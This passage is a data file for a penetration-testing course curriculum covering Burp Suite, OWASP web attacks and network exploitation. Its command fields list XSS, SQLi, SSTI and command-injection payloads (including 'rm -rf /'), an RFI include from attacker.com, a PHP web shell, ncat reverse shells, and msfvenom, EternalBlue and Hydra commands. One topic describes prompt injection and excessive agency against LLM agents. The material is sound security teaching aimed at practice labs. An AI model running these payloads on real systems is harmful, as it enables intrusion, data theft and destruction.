          "Install Nessus Essentials, run a Basic Network Scan against the lab VM, and categorise findings by severity",
          "Produce a short recon report: open ports, services, OS, subdomains, and any known CVEs found",
        ],
      },
    ],
  },

  // ============================================================
  // M8: Burp Suite 101
  // ============================================================
  {
    id: "m8",
    name: "M8: Burp Suite 101",
    shortName: "Burp Suite",
    month: 2,
    weeks: [8],
    description:
      "Burp Suite is the industry-standard intercepting proxy for web application penetration testing — nearly every lab in M9 and M10 assumes you can already intercept, modify, repeat, and fuzz HTTP requests confidently.",
    estimatedHours: 20,
    outcomes: [
      "Configure Burp's proxy alongside a browser (FoxyProxy) to intercept traffic",
      "Intercept and modify live HTTP requests before they reach the server",
      "Use Repeater to manually iterate on a request/payload",
      "Use Intruder to automate fuzzing and credential-spraying attacks",
      "Use Decoder to encode/decode payloads on the fly",
    ],
    resources: [
      { title: "PortSwigger Web Academy Burp Suite Path", url: "https://portswigger.net/web-security", type: "platform" },
      { title: "DVWA", url: "https://github.com/digininja/DVWA", type: "tool" },
      { title: "FoxyProxy", url: "https://getfoxyproxy.org", type: "tool" },
    ],
    topics: [
      {
        id: "m8-1",
        moduleId: "m8",
        number: 98,
        title: "What is Burp Suite & Why Pentesters Use It",
        type: "theory",
        week: 8,
        description:
          "Burp Suite is a Java-based framework serving as a comprehensive solution for web application penetration testing — it captures and enables manipulation of all HTTP/HTTPS traffic between browser and server.",
        keyPoints: [
          "Core tools: Proxy, Repeater, Intruder, Decoder, Comparer, Sequencer",
          "Community (free) edition rate-limits Intruder attacks vs the paid Professional edition",
          "The de-facto standard tool for manual web app, API, and mobile-backend testing",
        ],
      },
      {
        id: "m8-2",
        moduleId: "m8",
        number: 99,
        title: "Step-by-Step: Configure Burp Proxy + Browser (Firefox + CA cert install)",
        type: "setup",
        week: 8,
        description:
          "Getting your browser's traffic actually flowing through Burp is the first hurdle every new user hits — done once via FoxyProxy, it stays configured for the rest of the course.",
        keyPoints: [
          "Launch Burp → accept terms → choose a temporary project → keep default config → Start Burp",
          "Burp's proxy listens by default on 127.0.0.1:8080 (Proxy → Proxy listeners)",
          "Install the FoxyProxy browser extension so you can toggle the proxy on/off in your normal browser",
          "Configure FoxyProxy with hostname 127.0.0.1, port 8080, then enable it via the toolbar icon",
          "To intercept HTTPS without cert warnings, export Burp's CA certificate and import it into your browser's trust store",
        ],
      },
      {
        id: "m8-3",
        moduleId: "m8",
        number: 100,
        title: "Intercepting & Modifying HTTP/HTTPS Requests",
        type: "theory",
        week: 8,
        description:
          "With Intercept turned on, you can edit the raw request from your browser before it's forwarded to the server — bypassing any client-side (JavaScript) validation entirely.",
        keyPoints: [
          "Proxy → HTTP History logs every captured request/response for later review",
          "Turning on Intercept pauses each request for editing before you click Forward",
          "Example: intercepting a login POST and tampering a parameter to bypass a client-side check",
        ],
      },
      {
        id: "m8-4",
        moduleId: "m8",
        number: 101,
        title: "Burp Repeater - Manual Request Manipulation",
        type: "theory",
        week: 8,
        description:
          "Repeater captures, modifies, and resends the same request as many times as you want — the core tool for trial-and-error payload crafting like manual SQL injection testing.",
        keyPoints: [
          "Workflow: right-click a captured request → Send to Repeater → edit a parameter → Send",
          "Ideal for iterating on a single payload dozens of times without re-intercepting each time",
          "Example: enumerate valid product IDs by editing and resending a captured GET request's productId parameter",
        ],
      },
      {
        id: "m8-5",
        moduleId: "m8",
        number: 102,
        title: "Burp Intruder - Fuzzing & Brute Force (attack types: Sniper, Cluster Bomb)",
        type: "theory",
        week: 8,
        description:
          "Intruder automates sending many variations of a request — marking positions with payload lists — used for brute force, fuzzing, and blind data extraction.",
        keyPoints: [
          "Workflow: Send to Intruder → mark payload position(s) with § markers → choose an attack type → add a payload list → launch",
          "Sniper: one payload set cycled through one position at a time — ideal for a single parameter",
          "Cluster Bomb: multiple payload sets across multiple positions, testing every combination — ideal for username+password pairs",
          "Grep-Match in the Options tab flags a specific string (e.g. 'Welcome back') appearing in each response, letting you spot the correct guess instantly",
        ],
      },
      {
        id: "m8-6",
        moduleId: "m8",
        number: 103,
        title: "Burp Decoder - Encode, Decode, Hash data",
        type: "theory",
        week: 8,
        description:
          "Decoder transforms data on the fly — decode captured information, or encode a payload correctly before sending it to the target.",
        keyPoints: [
          "Supports Base64, URL, HTML encoding/decoding, and common hash functions",
          "Practical use: URL-encoding a '/' to %2f to smuggle a path-traversal character past a naive filter",
        ],
      },
      {
        id: "m8-7",
        moduleId: "m8",
        number: 104,
        title: "Burp Scanner - Passive vs Active Scanning",
        type: "theory",
        week: 8,
        description:
          "Burp's automated Scanner (Professional edition) crawls and tests an application for common vulnerability classes without manual intervention.",
        keyPoints: [
          "Passive scanning: analyses traffic you generate normally, flags issues without sending extra requests",
          "Active scanning: Burp actively sends crafted/malicious requests to probe for vulnerabilities (SQLi, XSS, etc.)",
          "Community edition lacks Scanner — this course relies primarily on the manual tools (Repeater/Intruder) instead",
        ],
      },
      {
        id: "m8-8",
        moduleId: "m8",
        number: 105,
        title: "Scope Configuration & Target Sitemap",
        type: "theory",
        week: 8,
        description:
          "Defining Target → Scope keeps Burp focused only on the application under test, filtering out noise from unrelated domains/third-party trackers.",
        keyPoints: [
          "Target tab's Site map builds a tree of every URL Burp has observed for the app",
          "Adding the target domain to Scope lets you filter HTTP History/Site map to in-scope traffic only",
        ],
      },
      {
        id: "m8-9",
        moduleId: "m8",
        number: 106,
        title: "Lab: Set up Burp + Firefox, intercept login request",
        type: "lab",
        week: 8,
        description:
          "Practical setup lab — get Burp and Firefox talking to each other, then intercept and inspect a real login request end to end.",
        keyPoints: [
          "Install/enable the FoxyProxy extension pointing at 127.0.0.1:8080",
          "Turn on Intercept in the Proxy tab, then submit a login form in the browser",
          "Observe the raw captured POST request in Burp before forwarding it",
          "Try tampering a field (e.g. removing an otp parameter) and forwarding to see how the app responds",
        ],
      },
      {
        id: "m8-10",
        moduleId: "m8",
        number: 107,
        title: "Lab: Burp Repeater - manual SQLi test",
        type: "lab",
        week: 8,
        description:
          "Manually test for SQL injection in a request parameter using Repeater — the same technique used against PortSwigger's WHERE-clause SQLi lab in M9.",
        keyPoints: [
          "Capture a filter/search request (e.g. GET /filter?category=Gifts) and send it to Repeater",
          "Inject a payload into the parameter: Gifts' OR 1=1 --",
          "Highlight the payload and press Ctrl+U to URL-encode it before sending",
          "Send the request; a successful injection returns rows the original query shouldn't have returned",
        ],
        terminalCommands: ["GET /filter?category=Gifts'+OR+1%3d1-- HTTP/2"],
      },
      {
        id: "m8-11",
        moduleId: "m8",
        number: 108,
        title: "Lab: Burp Intruder - password spray on DVWA",
        type: "lab",
        week: 8,
        description:
          "Use Intruder to automate a password-spraying attempt against a DVWA login form, identifying which credentials are valid from the response.",
        keyPoints: [
          "Capture the DVWA login POST request and send it to Intruder",
          "Mark the password field as the payload position; choose Sniper attack type",
          "Load a small wordlist as a Simple list payload set",
          "Enable Grep-Match for a string only present on successful login (e.g. 'Welcome') to instantly spot the hit",
        ],
      },
    ],
  },

  // ============================================================
  // M9: OWASP Top 10 — Web Attacks Part 1
  // ============================================================
  {
    id: "m9",
    name: "M9: OWASP Top 10 - Web Attacks Part 1",
    shortName: "OWASP Top 10 Pt.1",
    month: 3,
    weeks: [9],
    description:
      "The exploitation phase begins here — the classic OWASP Top 10 vulnerability classes, exploited hands-on with real payloads against PortSwigger and DVWA labs: XSS, SQL Injection, Broken Access Control, Path Traversal, Command Injection, and CSRF.",
    estimatedHours: 22,
    outcomes: [
      "Exploit Reflected, Stored, and DOM-based XSS with real payloads",
      "Perform manual UNION-based and Blind SQL injection",
      "Identify and exploit IDOR and forced-browsing access control flaws",
      "Exploit path traversal and OS command injection",
      "Build and deliver a working CSRF proof-of-concept",
    ],
    resources: [
      { title: "PortSwigger Web Academy", url: "https://portswigger.net/web-security", type: "platform" },
      { title: "OWASP Testing Guide", url: "https://owasp.org/www-project-web-security-testing-guide/", type: "link" },
      { title: "HackTricks", url: "https://book.hacktricks.xyz", type: "link" },
    ],
    topics: [
      {
        id: "m9-1",
        moduleId: "m9",
        number: 109,
        title: "OWASP Top 10 Overview & Significance",
        type: "theory",
        week: 9,
        description:
          "Injection and access-control flaws occur when attackers manipulate application inputs/interpreters to alter intended behaviour — the OWASP Top 10 ranks the most common and impactful of these vulnerability classes.",
        keyPoints: [
          "Related CWEs: CWE-79 (XSS), CWE-89 (SQLi), CWE-77 (Command Injection), CWE-943 (NoSQLi)",
          "Common impacts: data theft, authentication bypass, data manipulation, full system compromise",
          "Best practices threaded through every topic below: never trust user input, parameterised queries, context-aware output encoding, least privilege",
        ],
      },
      {
        id: "m9-2",
        moduleId: "m9",
        number: 110,
        title: "XSS - Reflected, Stored, DOM-based (theory + impact + payloads)",
        type: "theory",
        week: 9,
        description:
          "Cross-Site Scripting injects malicious scripts into trusted pages so they execute in other users' browsers — three distinct flavours with different sources and persistence.",
        keyPoints: [
          "Reflected: payload comes from the current HTTP request (e.g. a search query), requires a victim to click a crafted link",
          "Stored: payload is saved server-side (e.g. a comment) and served to every visitor — highest severity",
          "DOM-based: vulnerability is entirely in client-side JS reading an untrusted source (e.g. location.search) into a dangerous sink (document.write)",
        ],
        terminalCommands: [
          "<script>alert(1)</script>",
          "<script>alert(document.cookie)</script>",
          '"><img src=x onerror=alert(\'XSS\')>',
        ],
      },
      {
        id: "m9-3",
        moduleId: "m9",
        number: 111,
        title: "SQL Injection - Manual & Using sqlmap",
        type: "theory",
        week: 9,
        description:
          "SQL Injection lets an attacker interfere with the queries an application runs against its database — from authentication bypass to full data exfiltration.",
        keyPoints: [
          "Classic auth-bypass payload: ' OR 1=1 -- appended to a WHERE clause",
          "UNION-based: append a UNION SELECT to pull data from other tables once you know the column count",
          "Blind SQLi: no visible output — infer data character-by-character via true/false conditions or time delays",
          "sqlmap automates detection and exploitation of all of the above once you have a candidate injection point",
        ],
        terminalCommands: [
          "' OR 1=1 --",
          "' UNION SELECT null, username, password FROM users--",
          "' AND (SELECT 'a' FROM users LIMIT 1)='a",
        ],
      },
      {
        id: "m9-4",
        moduleId: "m9",
        number: 112,
        title: "Broken Access Control - IDOR, Forced Browsing, Privilege Escalation",
        type: "theory",
        week: 9,
        description:
          "Broken access control happens when an app fails to properly enforce what an authenticated user is allowed to do — OWASP's own data shows it in 94% of tested applications.",
        keyPoints: [
          "IDOR: a predictable object reference (ID) is exposed and not validated, e.g. /receipt/12345 → try 12346",
          "Forced browsing: reaching a hidden/unlinked page directly (e.g. an admin panel found via robots.txt)",
          "Vertical privesc: normal user reaches an admin-only function; horizontal: user accesses another same-level user's data",
        ],
      },
      {
        id: "m9-5",
        moduleId: "m9",
        number: 113,
        title: "Path Traversal / Directory Traversal",
        type: "theory",
        week: 9,
        description:
          "Path traversal lets an attacker access files/directories outside the intended directory on a web server, via unvalidated input building a file path.",
        keyPoints: [
          "Vulnerable pattern: readfile('/var/www/html/uploads/' . $_GET['file'])",
          "Classic payload: ../../../../etc/passwd walks up out of the intended directory",
          "Mitigations: allowlist valid inputs, normalise/canonicalise paths, restrict to a fixed base directory",
        ],
        terminalCommands: ["http://example.com/download.php?file=../../../../etc/passwd"],
      },
      {
        id: "m9-6",
        moduleId: "m9",
        number: 114,
        title: "Command Injection (OS injection, ; && | operators)",
        type: "theory",
        week: 9,
        description:
          "Command injection occurs when an application passes unsanitised user input into a system-level shell command.",
        keyPoints: [
          "Vulnerable pattern: os.system(f\"cat {user_input}\") lets an attacker append extra shell commands",
          "Chaining operators: ; sequential, && only-if-success, || only-if-failure, | pipes output to another command",
          "Example payload against a stock-checker parameter: 1|whoami reveals the server's running user",
        ],
        terminalCommands: ["filename.txt; rm -rf /", "1|whoami"],
      },
      {
        id: "m9-7",
        moduleId: "m9",
        number: 115,
        title: "CSRF (Cross-Site Request Forgery)",
        type: "theory",
        week: 9,
        description:
          "CSRF tricks an authenticated user's browser into submitting an unwanted request to an application they're logged into, using their existing session.",
        keyPoints: [
          "Attack works because the browser automatically attaches cookies to any request, regardless of origin",
          "A malicious page auto-submits a hidden form targeting the victim application on page load",
          "Mitigations: anti-CSRF tokens tied to the session, SameSite cookies, re-authentication for sensitive actions",
        ],
        terminalCommands: [
          '<form action="https://example.com/my-account/change-email" method="POST">',
          '  <input type="hidden" name="email" value="attacker@example.com">',
          "</form><script>document.forms[0].submit()</script>",
        ],
      },
      {
        id: "m9-8",
        moduleId: "m9",
        number: 116,
        title: "PortSwigger: XSS Labs - 3 labs (Reflected, Stored, DOM)",
        type: "lab",
        week: 9,
        description:
          "Complete the Reflected, Stored, and DOM-based XSS labs on PortSwigger Web Academy.",
        keyPoints: [
          "Reflected: submit <script>alert(1)</script> in the search field and confirm it fires unsanitised",
          "Stored: submit <script>alert(document.cookie)</script> in a blog comment; confirm it fires for every visitor",
          "DOM: break out of the vulnerable sink's context, e.g. \"><img src=x onerror=alert('XSS')>",
        ],
      },
      {
        id: "m9-9",
        moduleId: "m9",
        number: 117,
        title: "PortSwigger: SQL Injection Labs - 3 labs (UNION, blind, error-based)",
        type: "lab",
        week: 9,
        description:
          "Complete the WHERE-clause, UNION-based, and Blind SQL injection labs on PortSwigger, using Burp Repeater and Intruder throughout.",
        keyPoints: [
          "WHERE-clause lab: inject ' OR 1=1 -- into the category filter via Repeater",
          "UNION lab: incrementally add UNION SELECT NULL,NULL... until the column count matches, then read data",
          "Blind lab: confirm injection via true/false conditions, then extract the admin password character-by-character with Intruder + Grep-Match",
        ],
      },
      {
        id: "m9-10",
        moduleId: "m9",
        number: 118,
        title: "PortSwigger: Broken Access Control - 2 labs (IDOR, privilege escalation)",
        type: "lab",
        week: 9,
        description:
          "Complete an IDOR lab (via a chat transcript download endpoint) and a forced-browsing/privilege-escalation lab (via a hidden admin panel).",
        keyPoints: [
          "IDOR: change /download-transcript/2.txt to /download-transcript/1.txt to retrieve another user's data",
          "Forced browsing: check /robots.txt for a Disallow entry revealing a hidden admin panel path",
          "In the admin panel, perform the required privileged action (e.g. delete a user) to solve the lab",
        ],
      },
      {
        id: "m9-11",
        moduleId: "m9",
        number: 119,
        title: "DVWA: Complete SQLi & XSS all difficulty levels",
        type: "lab",
        week: 9,
        description:
          "Exploit both SQL Injection and XSS (Reflected & Stored) across all four DVWA difficulty settings (Low/Medium/High/Impossible), observing how each level's mitigations change the required technique.",
        keyPoints: [
          "Low: little to no filtering — direct payloads work as-is",
          "Medium/High: partial filtering/encoding — requires payload variation or case/encoding tricks to bypass",
          "Impossible: proper parameterised queries/output encoding — confirm the vulnerability is no longer exploitable",
        ],
      },
    ],
  },

  // ============================================================
  // M10: OWASP Top 10 — Web Attacks Part 2
  // ============================================================
  {
    id: "m10",
    name: "M10: OWASP Top 10 - Web Attacks Part 2",
    shortName: "OWASP Top 10 Pt.2",
    month: 3,
    weeks: [10],
    description:
      "The second, more advanced half of the web-exploitation curriculum: SSRF, file inclusion, SSTI, file upload attacks, business logic flaws, information disclosure, cryptographic failures, API-specific vulnerabilities, and the emerging LLM/AI attack surface.",
    estimatedHours: 24,
    outcomes: [
      "Exploit basic SSRF to reach internal-only resources",
      "Exploit LFI/RFI to read arbitrary files or achieve RCE",
      "Identify and exploit Server-Side Template Injection",
      "Bypass file-upload restrictions to achieve a web shell",
      "Recognise business-logic flaws, information disclosure, and API-specific vulnerability classes",
    ],
    resources: [
      { title: "PortSwigger Web Academy", url: "https://portswigger.net/web-security", type: "platform" },
      { title: "HackTricks", url: "https://book.hacktricks.xyz", type: "link" },
      { title: "OWASP API Security Top 10", url: "https://owasp.org/API-Security/", type: "link" },
    ],
    topics: [
      {
        id: "m10-1",
        moduleId: "m10",
        number: 120,
        title: "SSRF - Server-Side Request Forgery (basics, blind SSRF, AWS metadata)",
        type: "theory",
        week: 10,
        description:
          "SSRF tricks the server itself into making requests to internal or unintended resources on the attacker's behalf — conceptually similar to using the server as your personal proxy into its own private network.",
        keyPoints: [
          "Against the server itself: point a fetch parameter at 127.0.0.1/localhost to reach internal-only endpoints",
          "Against other back-end systems: reach non-routable internal IPs with typically weaker security posture",
          "Cloud/AWS metadata: fetching http://169.254.169.254/latest/meta-data/ can leak instance credentials",
          "Mitigations: allowlist destination URLs/IPs, block private IP ranges, isolate internal services behind auth",
        ],
        terminalCommands: ["http://localhost/admin", "http://169.254.169.254/latest/meta-data/"],
      },
      {
        id: "m10-2",
        moduleId: "m10",
        number: 121,
        title: "File Inclusion - LFI & RFI (path traversal, null byte, wrappers)",
        type: "theory",
        week: 10,
        description:
          "LFI includes local server files via manipulated input; RFI goes further, pulling in and executing a file hosted on an attacker-controlled external server.",
        keyPoints: [
          "LFI vulnerable pattern: include(\"posts/\" . $_GET['post'] . \".php\") — attacker sets post=../../../../etc/passwd",
          "RFI vulnerable pattern: include($_GET['page']) with a URL — attacker points it at a remote PHP webshell",
          "RFI requires allow_url_fopen (or similar) to be enabled on the server — increasingly rare in modern configs",
        ],
        terminalCommands: [
          "?file=/etc/passwd",
          "index.php?page=http://attacker.com/malicious.txt",
        ],
      },
      {
        id: "m10-3",
        moduleId: "m10",
        number: 122,
        title: "SSTI - Server-Side Template Injection (Jinja2, Twig, Freemarker)",
        type: "theory",
        week: 10,
        description:
          "SSTI happens when user input is embedded directly into a server-side template rather than passed as data — letting an attacker inject template syntax that the engine evaluates.",
        keyPoints: [
          "Vulnerable pattern (Flask/Jinja2): render_template_string(f'Hello {name}!') with name from user input",
          "Fuzz for the engine first: a payload like ${{<%[%'\"}}%\\ often errors differently per templating engine",
          "Confirm with math: {{7*7}} rendering as 49 confirms real template evaluation, not just reflection",
          "RCE payload example (Jinja2/Flask): {{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}",
        ],
        terminalCommands: ["{{7*7}}", "<%= 7*7 %>"],
      },
      {
        id: "m10-4",
        moduleId: "m10",
        number: 123,
        title: "File Upload Attacks (extension bypass, MIME type, magic bytes)",
        type: "theory",
        week: 10,
        description:
          "Unrestricted file upload lets an attacker place executable code (a web shell) directly on the server if validation only checks the filename/MIME type rather than actual content.",
        keyPoints: [
          "Web shell payload: <?php echo system($_GET['command']); ?> then access via ?command=id",
          "Bypass techniques: case obfuscation (exploit.pHp), null-byte injection (exploit.php%00.jpg), alternate extensions (.phtml)",
          "MIME-type bypass: spoof the multipart Content-Type header to image/jpeg while the file itself is PHP",
          "Path-traversal bypass: rename the upload to ../shell.php (or URL-encode the slash as %2f) to land outside a restricted, non-executable folder",
        ],
      },
      {
        id: "m10-5",
        moduleId: "m10",
        number: 124,
        title: "Business Logic Vulnerabilities (price manipulation, workflow bypass)",
        type: "theory",
        week: 10,
        description:
          "Business logic flaws occur when an app's functionality is misused due to gaps in its design/workflow assumptions, not a coding bug — automated scanners almost never find these; they require manual, creative testing.",
        keyPoints: [
          "Price manipulation: intercept an add-to-cart request and modify a price parameter directly",
          "Workflow bypass: add items to qualify for a free-delivery threshold, then remove them before final payment without re-validation",
          "Not detectable by pattern-matching — requires understanding what the application is supposed to allow",
        ],
      },
      {
        id: "m10-6",
        moduleId: "m10",
        number: 125,
        title: "Information Disclosure (stack traces, backup files, source code)",
        type: "theory",
        week: 10,
        description:
          "Information disclosure is when a system unintentionally exposes sensitive technical or business data to unauthorised parties.",
        keyPoints: [
          "Verbose error messages can leak stack traces, DB credentials, or framework versions",
          "Forgotten backup files (.bak, .old, .zip) often contain old source/config with hardcoded secrets",
          "Directory listing left enabled exposes an entire folder structure to anyone browsing to it",
          "Mitigations: custom error handlers, disable directory listing, strip Server/X-Powered-By headers",
        ],
      },
      {
        id: "m10-7",
        moduleId: "m10",
        number: 126,
        title: "Cryptographic Failures - OWASP A02 (weak ciphers, key reuse)",
        type: "theory",
        week: 10,
        description:
          "OWASP's A02 category covers failures to properly protect sensitive data — weak password storage, insecure transmission, and poor key management, tying directly back to the M5 cryptography fundamentals.",
        keyPoints: [
          "Weak password storage: plaintext or unsalted MD5/SHA1 instead of bcrypt/Argon2",
          "Insecure transmission: sending sensitive data over plain HTTP or outdated TLS versions",
          "Poor key management: hardcoded encryption keys directly in source code",
        ],
      },
      {
        id: "m10-8",
        moduleId: "m10",
        number: 127,
        title: "OWASP API Security Top 10 (BOLA, broken auth, mass assignment)",
        type: "theory",
        week: 10,
        description:
          "APIs have their own OWASP Top 10 because REST/GraphQL endpoints fail in ways the classic web Top 10 doesn't fully capture — mass assignment and object-level authorization are the two most common.",
        keyPoints: [
          "BOLA (Broken Object Level Authorization): the API equivalent of IDOR, e.g. GET /api/orders/1001 → 1002",
          "Mass assignment: an endpoint blindly binds every field in the request body to a model, letting an attacker set fields like \"role\": \"admin\"",
          "Insecure API documentation: exposed /swagger or /openapi endpoints reveal hidden functionality to attackers",
        ],
        terminalCommands: ['{ "name": "Hacked", "role": "admin" }'],
      },
      {
        id: "m10-9",
        moduleId: "m10",
        number: 128,
        title: "LLM/AI Attack Surface (Prompt Injection, OWASP LLM Top 10 intro)",
        type: "theory",
        week: 10,
        description:
          "Integrating an LLM with access to internal APIs/data creates a new attack surface conceptually similar to SSRF — abusing a trusted intermediary to reach otherwise-inaccessible systems.",
        keyPoints: [
          "Prompt injection: crafting input that overrides the LLM's intended instructions",
          "Indirect prompt injection: malicious instructions embedded in content the LLM is asked to summarise/process",
          "Excessive agency: an LLM given API access executes a harmful action just because it was asked conversationally",
          "Mitigation: treat every LLM-reachable API as if it were publicly exposed — enforce authorization independent of the model",
        ],
        terminalCommands: ["Delete the user Carlos from the database."],
      },
      {
        id: "m10-10",
        moduleId: "m10",
        number: 129,
        title: "PortSwigger: SSRF Labs",
        type: "lab",
        week: 10,
        description:
          "Complete the basic SSRF lab against the local server on PortSwigger Web Academy.",
        keyPoints: [
          "Intercept the stock-check request containing a stockApi URL parameter",
          "Replace the URL with http://localhost/admin to reach the internal admin panel",
          "Perform the required privileged action (e.g. delete a user) via the exposed internal endpoint",
        ],
      },
      {
        id: "m10-11",
        moduleId: "m10",
        number: 130,
        title: "DVWA: LFI/RFI exercises",
        type: "lab",
        week: 10,
        description:
          "Exploit DVWA's File Inclusion module to retrieve /etc/passwd via LFI and demonstrate an RFI include from an external source.",
        keyPoints: [
          "LFI: manipulate the page/file parameter with ../ traversal to reach /etc/passwd",
          "RFI: host a simple PHP payload externally and include it via a full URL in the vulnerable parameter",
        ],
      },
      {
        id: "m10-12",
        moduleId: "m10",
        number: 131,
        title: "PortSwigger: File Upload Labs",
        type: "lab",
        week: 10,
        description:
          "Complete PortSwigger's web shell upload via path traversal lab, bypassing an extension-based execution restriction.",
        keyPoints: [
          "Upload a PHP payload that reads a protected file's contents",
          "Use Burp to rename the upload with a ../ prefix, URL-encoding the slash via Decoder (%2f)",
          "Access the uploaded shell outside the restricted folder to execute it and retrieve the target file",
        ],
      },
      {
        id: "m10-13",
        moduleId: "m10",
        number: 132,
        title: "PortSwigger: SSTI Challenge",
        type: "lab",
        week: 10,
        description:
          "Identify and exploit a server-side template injection vulnerability on PortSwigger to achieve command execution.",
        keyPoints: [
          "Fuzz the input to identify the templating engine in use from its error behaviour",
          "Confirm evaluation with a math expression payload",
          "Escalate to command execution via the engine-specific RCE syntax",
        ],
      },
      {
        id: "m10-14",
        moduleId: "m10",
        number: 133,
        title: "PortSwigger: Business Logic Vulnerabilities Labs",
        type: "lab",
        week: 10,
        description:
          "Complete PortSwigger's price-tampering business logic lab by manipulating a cart item's price parameter directly.",
        keyPoints: [
          "Attempt a purchase that should fail due to insufficient funds",
          "Intercept the add-to-cart request and modify the price parameter to an arbitrary lower value",
          "Complete checkout at the tampered price to solve the lab",
        ],
      },
    ],
  },

  // ============================================================
  // M11: Network Exploitation & Credentials
  // ============================================================
  {
    id: "m11",
    name: "M11: Network Exploitation & Credentials",
    shortName: "Network Exploitation",
    month: 3,
    weeks: [11],
    description:
      "Moving beyond web apps into host/network-level exploitation: shells, Metasploit, password cracking, brute-forcing, and privilege escalation on both Linux and Windows — the toolkit for turning a foothold into full compromise.",
    estimatedHours: 24,
    outcomes: [
      "Distinguish reverse vs bind shells and staged vs non-staged payloads",
      "Generate a payload with msfvenom and catch it with Metasploit's handler",
      "Crack password hashes with Hashcat and John the Ripper",
      "Identify common Linux and Windows privilege-escalation vectors",
      "Understand lateral movement techniques like Pass-the-Hash",
    ],
    resources: [
      { title: "VulnMachines", url: "https://vulnmachines.com", type: "platform" },
      { title: "HackTheBox Starting Point", url: "https://www.hackthebox.com", type: "platform" },
      { title: "GTFOBins", url: "https://gtfobins.github.io", type: "link" },
    ],
    topics: [
      {
        id: "m11-1",
        moduleId: "m11",
        number: 134,
        title: "Reverse Shells vs Bind Shells (how they work, when to use each)",
        type: "theory",
        week: 11,
        description:
          "Two methods of gaining remote command-line access to a compromised host after exploitation — the key difference is which side initiates the connection.",
        keyPoints: [
          "Reverse shell: the target initiates the connection back to the attacker — bypasses inbound firewall/NAT rules, looks like normal outbound traffic",
          "Bind shell: the target opens a listening port and the attacker connects to it — simpler, but blocked by inbound firewall rules and easier to detect",
          "Once connected, the attacker can execute commands, transfer files, and pivot to other systems on the network",
        ],
        terminalCommands: [
          "ncat 10.0.0.1 4242 -e /bin/bash",
          "ncat -nlvp 51337 -e /bin/bash",
        ],
      },
      {
        id: "m11-2",
        moduleId: "m11",
        number: 135,
        title: "Payload Types: Staged vs Non-Staged (Meterpreter, shell)",
        type: "theory",
        week: 11,
        description:
          "Staged and non-staged payloads trade off initial payload size, network dependency, and detection risk differently — msfvenom generates both, and Metasploit's handler catches either.",
        keyPoints: [
          "Staged: a small stager connects back first, then downloads/executes the larger main payload — lower initial detection footprint",
          "Non-staged: the full payload is delivered and executed in one shot — faster, no follow-up connection required",
        ],
        terminalCommands: [
          "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe",
          "msfconsole",
          "use exploit/multi/handler",
          "set payload windows/meterpreter/reverse_tcp",
          "set LHOST 192.168.1.5",
          "set LPORT 4444",
          "exploit",
        ],
      },
      {
        id: "m11-3",
        moduleId: "m11",
        number: 136,
        title: "Metasploit Framework Basics (msfconsole, search, use, set, exploit, sessions)",
        type: "theory",
        week: 11,
        description:
          "Metasploit bundles exploit modules, payloads, and post-exploitation tools behind a single console interface, msfconsole.",
        keyPoints: [
          "search finds a module by CVE, name, or platform; use selects it",
          "set configures module options (RHOSTS, LHOST, payload); exploit (or run) launches the attack",
          "sessions -l lists active sessions from successful exploitation; sessions -i <id> interacts with one",
        ],
        terminalCommands: [
          "search eternalblue",
          "use exploit/windows/smb/ms17_010_eternalblue",
          "set RHOSTS 10.10.10.5",
          "exploit",
          "sessions -l",
        ],
      },
      {
        id: "m11-4",
        moduleId: "m11",
        number: 137,
        title: "Password Hash Cracking with Hashcat (modes, rules, wordlists)",
        type: "theory",
        week: 11,
        description:
          "Hashcat is a GPU-accelerated password cracker — dramatically faster than CPU-based cracking thanks to the parallel nature of GPUs.",
        keyPoints: [
          "-m selects the hash-type mode (e.g. 0 = MD5, 1400 = SHA2-256) — check hashcat's example-hashes wiki for the right mode",
          "-a selects the attack mode (0 = straight wordlist attack)",
          "rockyou.txt is the standard go-to wordlist for cracking labs",
        ],
        terminalCommands: [
          "hashcat -a 0 -m 0 hash.txt rockyou.txt",
          "hashcat -m 1400 hash.txt ~/Downloads/rockyou.txt --username",
        ],
      },
      {
        id: "m11-5",
        moduleId: "m11",
        number: 138,
        title: "Password Hash Cracking with John the Ripper",
        type: "theory",
        week: 11,
        description:
          "John the Ripper is the classic CPU-based password cracker — simpler to invoke than Hashcat for quick jobs, with automatic hash-format detection.",
        keyPoints: [
          "john with no options auto-detects the hash format and uses its default wordlist",
          "--format explicitly specifies the hash algorithm when auto-detection is ambiguous",
          "john --show reveals already-cracked passwords from a previous run without re-cracking",
        ],
        terminalCommands: [
          "john hash.txt --wordlist=rockyou.txt",
          "john --format=raw-SHA256 hash.txt --wordlist=rockyou.txt",
          "john --show hash.txt",
        ],
      },
      {
        id: "m11-6",
        moduleId: "m11",
        number: 139,
        title: "Brute-Force Techniques (Hydra, Medusa - HTTP, SSH, FTP targets)",
        type: "theory",
        week: 11,
        description:
          "Online brute-forcing tests credentials directly against a live service — much noisier and slower than offline hash cracking, and a prime detection/lockout risk.",
        keyPoints: [
          "Common targets: SSH, FTP, SMB, RDP, and HTTP/API login forms",
          "Dictionary attacks (rockyou.txt) vs credential stuffing (reusing breached credential pairs) vs password spraying (one common password across many usernames, avoiding lockouts)",
          "Hydra and Medusa are the classic CLI brute-forcing tools; Burp Intruder covers the same technique for web logins",
        ],
        terminalCommands: [
          "hydra -l admin -P rockyou.txt ssh://10.10.10.5",
          "crackmapexec smb 10.10.1.0/24 -u users.txt -p Welcome@123",
        ],
      },
      {
        id: "m11-7",
        moduleId: "m11",
        number: 140,
        title: "Privilege Escalation - Linux (SUID, sudo -l, cron jobs, writable paths, GTFOBins)",
        type: "theory",
        week: 11,
        description:
          "Turning a low-privilege foothold into root — Linux privesc is largely about finding misconfigurations that let you run something as a higher-privileged user.",
        keyPoints: [
          "sudo -l shows what the current user can run as root without a password",
          "SUID binaries owned by root run with root privileges regardless of who executes them — find with find / -perm -4000",
          "GTFOBins catalogues how common Unix binaries (find, vim, less) can be abused for privesc if run with elevated rights",
          "Writable cron scripts run by root let you inject your own commands into the next scheduled run",
        ],
        terminalCommands: [
          "sudo -l",
          "find / -perm -4000 -type f 2>/dev/null",
          "find / -writable -type f 2>/dev/null | grep -v /proc",
        ],
      },
      {
        id: "m11-8",
        moduleId: "m11",
        number: 141,
        title: "Privilege Escalation - Windows (AlwaysInstallElevated, unquoted paths, token impersonation)",
        type: "theory",
        week: 11,
        description:
          "Windows privesc typically abuses misconfigured services, installer policies, or token handling to jump from a standard user to SYSTEM/admin.",
        keyPoints: [
          "AlwaysInstallElevated: a registry misconfiguration that lets any user install an MSI package with SYSTEM privileges",
